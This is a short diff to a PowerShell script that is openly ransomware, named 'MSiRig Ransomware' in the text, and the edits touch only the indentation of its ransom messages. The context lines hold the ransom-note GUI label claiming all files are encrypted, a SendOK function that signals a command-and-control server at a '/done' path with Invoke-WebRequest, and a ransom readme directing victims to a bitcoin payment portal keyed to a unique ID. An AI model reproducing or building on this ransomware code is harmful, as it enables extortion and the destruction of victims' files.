@@ -352,7 +352,7 @@ $skullLabel = New-Object System.Windows.Forms.Label
 $skullLabel.ForeColor = [System.Drawing.Color]::Red
 $skullLabel.BackColor = [System.Drawing.Color]::Black
 $skullLabel.Text = @"
-    ☠️ ALL YOUR FILES ARE ENCRYPTED! ☠️
+    ☠️ ALL YOUR FILES ARE ENCRYPTED! ☠️
    
     Your documents, photos, databases, and other
     important files have been encrypted with strong
@@ -582,7 +582,7 @@ function SendOK {
     Invoke-WebRequest -useb "$C2Server`:$C2Port/done" -Method GET 2>&1> $null }
 
 function CreateReadme {
-    $ReadmeTXT = @"
+$ReadmeTXT = @"
 All your files have been encrypted by MSiRig Ransomware! To recover them, you need the unique decryption key. If you are seeing this, your files are encrypted.
 
 A. To obtain the decryption key, visit our payment portal: http://bitcoin.com/pay/$script:UniquePaymentID
